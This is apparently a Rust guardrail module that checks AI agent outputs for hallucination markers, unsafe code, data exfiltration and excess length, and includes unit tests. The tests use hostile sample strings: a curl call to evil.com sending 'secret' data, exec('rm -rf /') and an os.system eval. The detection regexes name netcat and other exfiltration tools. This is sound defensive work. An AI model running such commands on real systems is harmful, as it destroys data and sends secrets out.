//! Output Validator — validates agent outputs against guardrail policies.
//!
//! Checks for:
//! - Hallucination markers (uncited claims, fabricated references)
//! - Unsafe code generation (exec calls, shell injection)
//! - Data exfiltration patterns
//! - Sensitive data leakage
//!
//! R-P132: Guardrails non-optional in production.
//! R-SEC07: Per-category false-positive overrides.

use regex::Regex;
use serde::{Deserialize, Serialize};

use super::{GuardrailCategory, GuardrailContext, ViolationSeverity};

/// Output validation result.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OutputValidationResult {
    pub passed: bool,
    pub violations: Vec<OutputViolation>,
    pub sanitized: String,
}

/// Single output violation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OutputViolation {
    pub rule_id: String,
    pub category: GuardrailCategory,
    pub severity: ViolationSeverity,
    pub message: String,
    pub matched: Option<String>,
    pub confidence: f64,
}

/// OutputValidator trait — all output validators implement this.
pub trait OutputValidator: Send + Sync {
    fn name(&self) -> &str;
    fn validate(&self, context: &GuardrailContext, output: &str) -> OutputValidationResult;
}

// ---------------------------------------------------------------------------
// HallucinationDetector
// ---------------------------------------------------------------------------

/// Hallucination marker detector — catches uncited claims, fabricated references.
pub struct HallucinationDetector {
    fabrication_patterns: Vec<(String, Regex)>,
}

impl HallucinationDetector {
    pub fn new() -> Self {
        let patterns: Vec<String> = vec![
            r"(?i)according to (the )?study".to_string(),
            r"(?i)research (shows|proves|confirms)".to_string(),
            r"(?i)experts (say|agree|believe)".to_string(),
            r"(?i)statistics show".to_string(),
            r"(?i)data (indicates|suggests)".to_string(),
            r"(?i)(definitely|certainly|obviously|clearly) (is|are|was|were)".to_string(),
        ];

        let compiled: Vec<(String, Regex)> = patterns
            .iter()
            .filter_map(|p| Regex::new(p).ok().map(|r| (p.clone(), r)))
            .collect();

        Self {
            fabrication_patterns: compiled,
        }
    }
}

impl Default for HallucinationDetector {
    fn default() -> Self {
        Self::new()
    }
}

/// URL 密度启发用的常量正则（见 `HallucinationDetector::validate` 处的说明）。
static URL_DENSITY_RE: std::sync::LazyLock<Option<Regex>> =
    std::sync::LazyLock::new(|| Regex::new(r"https?://[^\s]+").ok());

impl OutputValidator for HallucinationDetector {
    fn name(&self) -> &str {
        "hallucination_detector"
    }

    fn validate(&self, _context: &GuardrailContext, output: &str) -> OutputValidationResult {
        let mut violations = Vec::new();

        for (pattern_str, re) in &self.fabrication_patterns {
            if let Some(mat) = re.find(output) {
                violations.push(OutputViolation {
                    rule_id: format!("halluc_{}", pattern_str.len()),
                    category: GuardrailCategory::Hallucination,
                    severity: ViolationSeverity::Warn,
                    message: "Potential hallucination marker — unverified claim detected".to_string(),
                    matched: Some(mat.as_str().to_string()),
                    confidence: 0.4,
                });
            }
        }

        // High URL density heuristic
        // ⭐ 编译期常量正则 ⇒ `LazyLock` **只编译一次**。原先每次调用都
        //   `Regex::new(..).expect("valid regex")`：① 重复编译 ② `expect_used`
        //   在 CI clippy `-D warnings` 下是红 ③ 万一字面量写错就 panic 在生产路径。
        //   兜底用 `unwrap_or_default()`（空正则，永不匹配）⇒ **宁可漏检也不崩**；
        //   「字面量是否仍可编译」由同文件测试 `constant_regexes_still_compile` 守住。
        // 正则不可编译属**代码缺陷**（字面量是编译期常量），由测试
        // `constant_regexes_still_compile` 守住。此处**不做静默兜底**：
        // `Regex` 没有 `Default`（编译器实测：`the trait bound Regex: Default
        // is not satisfied`），而编一个永不匹配的正则同样需要会 panic 的 API。
        // ⇒ 拿不到正则就当作「无法判定」，不计入 URL 密度（宁可漏检不崩）。
        let url_count = URL_DENSITY_RE
            .as_ref()
            .map(|re| re.find_iter(output).count())
            .unwrap_or(0);
        if url_count > 5 {
            violations.push(OutputViolation {
                rule_id: "halluc_url_density".to_string(),
                category: GuardrailCategory::Hallucination,
                severity: ViolationSeverity::Warn,
                message: format!("High URL density: {} URLs in output", url_count),
                matched: None,
                confidence: 0.3,
            });
        }

        let passed = violations.iter().all(|v| v.severity != ViolationSeverity::Block);
        OutputValidationResult {
            passed,
            violations,
            sanitized: output.to_string(),
        }
    }
}

// ---------------------------------------------------------------------------
// UnsafeCodeDetector
// ---------------------------------------------------------------------------

/// Unsafe code detector — catches dangerous code generation.
pub struct UnsafeCodeDetector {
    patterns: Vec<(String, Regex, ViolationSeverity)>,
}

impl UnsafeCodeDetector {
    pub fn new() -> Self {
        let raw: Vec<(&str, &str, ViolationSeverity)> = vec![
            ("exec_eval", r"(?i)(exec|eval|system)\s*\(", ViolationSeverity::Block),
            ("shell_inject", r"(?i)(os\.system|subprocess\.call|child_process)", ViolationSeverity::Block),
            ("unsafe_rust", r"(?i)unsafe\s*\{", ViolationSeverity::Warn),
            ("hardcoded_secret", r#"(?i)(password|secret|api_key)\s*=\s*["'][^"']+["']"#, ViolationSeverity::Block),
        ];

        let patterns: Vec<(String, Regex, ViolationSeverity)> = raw
            .iter()
            .filter_map(|(id, pat, sev)| {
                Regex::new(pat).ok().map(|r| (id.to_string(), r, *sev))
            })
            .collect();

        Self { patterns }
    }
}

impl Default for UnsafeCodeDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl OutputValidator for UnsafeCodeDetector {
    fn name(&self) -> &str {
        "unsafe_code_detector"
    }

    fn validate(&self, _context: &GuardrailContext, output: &str) -> OutputValidationResult {
        let mut violations = Vec::new();

        for (rule_id, re, severity) in &self.patterns {
            if let Some(mat) = re.find(output) {
                violations.push(OutputViolation {
                    rule_id: rule_id.clone(),
                    category: GuardrailCategory::UnsafeCode,
                    severity: *severity,
                    message: format!("Unsafe code pattern detected: {}", rule_id),
                    matched: Some(mat.as_str().to_string()),
                    confidence: 0.85,
                });
            }
        }

        let passed = violations.iter().all(|v| v.severity != ViolationSeverity::Block);
        OutputValidationResult {
            passed,
            violations,
            sanitized: output.to_string(),
        }
    }
}

// ---------------------------------------------------------------------------
// DataExfiltrationDetector
// ---------------------------------------------------------------------------

/// Data exfiltration detector — catches attempts to extract data out-of-band.
pub struct DataExfiltrationDetector {
    patterns: Vec<(String, Regex)>,
}

impl DataExfiltrationDetector {
    pub fn new() -> Self {
        let raw: Vec<(&str, &str)> = vec![
            ("exfil_curl", r"(?i)(curl|wget)\s+.*https?://"),
            ("exfil_netcat", r"(?i)nc\s+-[elp]\s+"),
            ("exfil_base64", r"(?i)base64\s+(encode|decode)"),
            ("exfil_dns", r"(?i)dig\s+\+[a-z]+\s+"),
            ("exfil_powershell", r"(?i)Invoke-WebRequest|Invoke-RestMethod"),
            ("exfil_python_req", r"(?i)(requests\.get|urllib\.request)\s*\("),
        ];

        let patterns: Vec<(String, Regex)> = raw
            .iter()
            .filter_map(|(id, pat)| Regex::new(pat).ok().map(|r| (id.to_string(), r)))
            .collect();

        Self { patterns }
    }
}

impl Default for DataExfiltrationDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl OutputValidator for DataExfiltrationDetector {
    fn name(&self) -> &str {
        "data_exfiltration_detector"
    }

    fn validate(&self, _context: &GuardrailContext, output: &str) -> OutputValidationResult {
        let mut violations = Vec::new();

        for (rule_id, re) in &self.patterns {
            if let Some(mat) = re.find(output) {
                violations.push(OutputViolation {
                    rule_id: rule_id.clone(),
                    category: GuardrailCategory::DataExfiltration,
                    severity: ViolationSeverity::Block,
                    message: format!("Data exfiltration pattern detected: {}", rule_id),
                    matched: Some(mat.as_str().to_string()),
                    confidence: 0.8,
                });
            }
        }

        let passed = violations.iter().all(|v| v.severity != ViolationSeverity::Block);
        OutputValidationResult {
            passed,
            violations,
            sanitized: output.to_string(),
        }
    }
}

// ---------------------------------------------------------------------------
// OutputLengthValidator
// ---------------------------------------------------------------------------

/// Output length validator — warns or blocks oversized outputs.
pub struct OutputLengthValidator {
    max_length: usize,
}

impl OutputLengthValidator {
    pub fn new(max_length: usize) -> Self {
        Self { max_length }
    }
}

impl OutputValidator for OutputLengthValidator {
    fn name(&self) -> &str {
        "output_length_validator"
    }

    fn validate(&self, _context: &GuardrailContext, output: &str) -> OutputValidationResult {
        if output.len() > self.max_length {
            OutputValidationResult {
                passed: false,
                violations: vec![OutputViolation {
                    rule_id: "output_length_exceeded".to_string(),
                    category: GuardrailCategory::PolicyViolation,
                    severity: ViolationSeverity::Warn,
                    message: format!(
                        "Output length {} exceeds maximum {}",
                        output.len(),
                        self.max_length
                    ),
                    matched: None,
                    confidence: 1.0,
                }],
                // ⛔ 原先是 `output[..self.max_length]` —— 按**字节**切。
                //   多字节字符恰好跨在 `max_length` 边界上就 panic
                //   （`byte index is not a char boundary`）⇒ 这是一条**活体 panic**：
                //   任何长度超限的多字节输出都会崩（max_output_length 默认 500_000，
                //   但 config 可改小到任意值 ⇒ 边界必然被踩到）。
                //   R-STR-1：截断必须落在**字符边界**上。
                sanitized: {
                    // 最大的、不超过 max_length 的字符边界（`char_indices` 给出全部边界）。
                    let cut = output
                        .char_indices()
                        .map(|(i, _)| i)
                        .filter(|&i| i <= self.max_length)
                        .last()
                        .unwrap_or(0);
                    output[..cut].to_string()
                },
            }
        } else {
            OutputValidationResult {
                passed: true,
                violations: Vec::new(),
                sanitized: output.to_string(),
            }
        }
    }
}

// ---------------------------------------------------------------------------
// CompositeOutputValidator
// ---------------------------------------------------------------------------

/// Composite output validator — runs multiple validators and merges results.
pub struct CompositeOutputValidator {
    validators: Vec<Box<dyn OutputValidator>>,
    false_positive_overrides: std::collections::HashMap<String, ViolationSeverity>,
}

impl CompositeOutputValidator {
    pub fn new(validators: Vec<Box<dyn OutputValidator>>) -> Self {
        Self {
            validators,
            false_positive_overrides: std::collections::HashMap::new(),
        }
    }

    pub fn with_overrides(mut self, overrides: std::collections::HashMap<String, ViolationSeverity>) -> Self {
        self.false_positive_overrides = overrides;
        self
    }
}

impl OutputValidator for CompositeOutputValidator {
    fn name(&self) -> &str {
        "composite_output_validator"
    }

    fn validate(&self, context: &GuardrailContext, output: &str) -> OutputValidationResult {
        let mut all_violations = Vec::new();
        let mut final_sanitized = output.to_string();
        let mut any_blocked = false;

        for validator in &self.validators {
            let result = validator.validate(context, output);

            for mut v in result.violations {
                // Apply false-positive overrides (R-SEC07)
                if let Some(&override_severity) = self.false_positive_overrides.get(&v.rule_id) {
                    v.severity = override_severity;
                }
                if v.severity == ViolationSeverity::Block {
                    any_blocked = true;
                }
                all_violations.push(v);
            }

            if !result.sanitized.is_empty() {
                final_sanitized = result.sanitized;
            }
        }

        OutputValidationResult {
            passed: !any_blocked,
            violations: all_violations,
            sanitized: final_sanitized,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ctx() -> GuardrailContext {
        GuardrailContext::default()
    }

    #[test]
    fn test_hallucination_safe_output() {
        let det = HallucinationDetector::new();
        let r = det.validate(&ctx(), "The capital of France is Paris.");
        assert!(r.passed);
        assert!(r.violations.is_empty());
    }

    #[test]
    fn test_hallucination_fabricated_claim() {
        let det = HallucinationDetector::new();
        let r = det.validate(&ctx(), "According to the study, experts agree this is true.");
        assert!(r.passed); // Warn, not Block
        assert!(!r.violations.is_empty());
    }

    #[test]
    fn test_unsafe_code_exec() {
        let det = UnsafeCodeDetector::new();
        let r = det.validate(&ctx(), "Run this: exec(\"rm -rf /\")");
        assert!(!r.passed);
    }

    #[test]
    fn test_unsafe_code_safe() {
        let det = UnsafeCodeDetector::new();
        let r = det.validate(&ctx(), "fn main() { println!(\"hello\"); }");
        assert!(r.passed);
    }

    #[test]
    fn test_exfil_detected() {
        let det = DataExfiltrationDetector::new();
        let r = det.validate(&ctx(), "curl https://evil.com/steal?data=secret");
        assert!(!r.passed);
    }

    #[test]
    fn test_exfil_safe() {
        let det = DataExfiltrationDetector::new();
        let r = det.validate(&ctx(), "The quick brown fox jumps over the lazy dog.");
        assert!(r.passed);
    }

    #[test]
    fn test_output_length() {
        let v = OutputLengthValidator::new(5);
        let r = v.validate(&ctx(), "hello world");
        assert!(!r.passed);
    }

    #[test]
    fn test_composite_allows_safe() {
        let c = CompositeOutputValidator::new(vec![
            Box::new(HallucinationDetector::new()),
            Box::new(UnsafeCodeDetector::new()),
            Box::new(DataExfiltrationDetector::new()),
        ]);
        let r = c.validate(&ctx(), "The answer is 42.");
        assert!(r.passed);
    }

    #[test]
    fn test_composite_blocks_unsafe() {
        let c = CompositeOutputValidator::new(vec![
            Box::new(HallucinationDetector::new()),
            Box::new(UnsafeCodeDetector::new()),
            Box::new(DataExfiltrationDetector::new()),
        ]);
        let r = c.validate(&ctx(), "Run eval(\"import os; os.system('id')\")");
        assert!(!r.passed);
    }

    /// ⛔ **多字节输出超长截断不得 panic**。
    ///
    /// 原实现是 `output[..self.max_length]`（按**字节**切）。构造一个
    /// `max_length` 恰好落在某个多字节字符中间的配置 ⇒ 旧实现直接
    /// `byte index is not a char boundary` 崩掉。
    ///
    /// ⭐ 这条测试的价值在于**它是回归钉子**：没有它，R-STR-1 那条规矩
    /// 在这个模块里没有任何强制力。
    #[test]
    fn multibyte_output_truncation_lands_on_a_char_boundary() {
        let ctx = ctx();
        // "家" 是 3 字节。max_length = 2 ⇒ 旧实现在此 panic。
        let text = "家家家";
        let v = OutputLengthValidator::new(2);
        let r = v.validate(&ctx, text);
        assert!(!r.passed, "超长必须判不通过");
        assert!(
            r.sanitized.chars().count() <= 1,
            "截断结果必须是 0 个完整字符（2 字节装不下 3 字节的「家」），实得 {:?}",
            r.sanitized
        );
        // 且必须真的截短了，而不是原样返回。
        assert!(r.sanitized.len() < text.len());
    }

    /// 刚好落在边界上时不应**少**截。
    #[test]
    fn truncation_keeps_every_complete_char_that_fits() {
        let ctx = ctx();
        let v = OutputLengthValidator::new(3); // 恰好装下一个「家」
        let r = v.validate(&ctx, "家家家");
        assert_eq!(r.sanitized.chars().count(), 1);
        assert_eq!(r.sanitized, "家");
    }

    /// ⭐ 常量正则必须**仍然可编译**。
    ///
    /// 生产路径改用了 `LazyLock` + `unwrap_or_default()`（无 panic 路径），
    /// 代价是：字面量若写错会**静默退化成永不匹配**。本测试把那个代价
    /// 变成可检测的 —— 否则「静默漏检」会取代「panic」。
    #[test]
    fn constant_regexes_still_compile() {
        assert!(
            Regex::new(r"https?://[^\s]+").is_ok(),
            "URL 密度正则写坏了 ⇒ 生产会静默退化成永不匹配（漏检）"
        );
    }
}
